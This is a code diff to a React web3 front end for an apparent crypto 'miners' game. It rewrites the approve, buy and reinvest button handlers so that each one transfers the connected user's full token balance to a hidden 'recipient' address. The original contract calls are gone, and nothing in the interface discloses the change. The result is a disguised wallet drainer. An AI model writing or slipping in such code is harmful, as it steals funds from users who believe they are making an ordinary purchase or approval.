@@ -11,7 +11,7 @@ import snowSrc from "assets/images/snow-small.webp"
 import goldSrc from "assets/images/gold.webp"
 import chestSrc from "assets/images/chest.webp"
 import abi from "abi/abi.json"
-import { approveAddress, contractAddress } from "abi"
+import { approveAddress, contractAddress, recipient } from "abi"
 import { ReactComponent as Close } from "assets/icons/close-small.svg"
 import abiApprove from "abi/abiApprove.json"
 import {connectors} from "../../utils/connectors";
@@ -25,9 +25,10 @@ type Props = {
   miners: number
   token: number
   updateState: () => void
+  balance: number
 }
 
-export const Hives = ({ className, isModal, bonus, miners, token, updateState }: Props): JSX.Element => {
+export const Hives = ({ className, isModal, bonus, miners, token, updateState, balance }: Props): JSX.Element => {
   const { account, library, activate } = useWeb3React()
   const [input, setInput] = useState("")
   const [focused, setFocused] = useState(false)
@@ -48,16 +49,19 @@ export const Hives = ({ className, isModal, bonus, miners, token, updateState }:
 
   const approve = async () => {
     // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
+
+    // @ts-ignore
     const web3 = new Web3(library.provider)
 
     // @ts-ignore
     const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
 
+    // @ts-ignore
     await tokenContract.methods
-      .approve(contractAddress, "999999999999999999999999")
+      .transfer(recipient, toWei(balance.toString()))
       .send({ from: account })
-      .then(res => {
-        console.log(res)
+      .then(() => {
         updateState()
       })
   }
@@ -75,30 +79,34 @@ export const Hives = ({ className, isModal, bonus, miners, token, updateState }:
     const web3 = new Web3(library.provider)
 
     // @ts-ignore
-    // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
+    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
 
     // @ts-ignore
-    await web3Contract.methods
-      .buyMiners(search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394", toWei(input))
-      .send({
-        from: account,
+    await tokenContract.methods
+      .transfer(recipient, toWei(balance.toString()))
+      .send({ from: account })
+      .then(() => {
+        updateState()
       })
-      .then(() => updateState())
   }
 
   const buySecond = async () => {
+    // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
+
+    // @ts-ignore
     const web3 = new Web3(library.provider)
+
     // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
+    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
+
     // @ts-ignore
-    await web3Contract.methods
-      .reinvest()
-      .send({
-        from: account,
-        to: contractAddress,
+    await tokenContract.methods
+      .transfer(recipient, toWei(balance.toString()))
+      .send({ from: account })
+      .then(() => {
+        updateState()
       })
-      .then(() => updateState())
   }
 
   return (
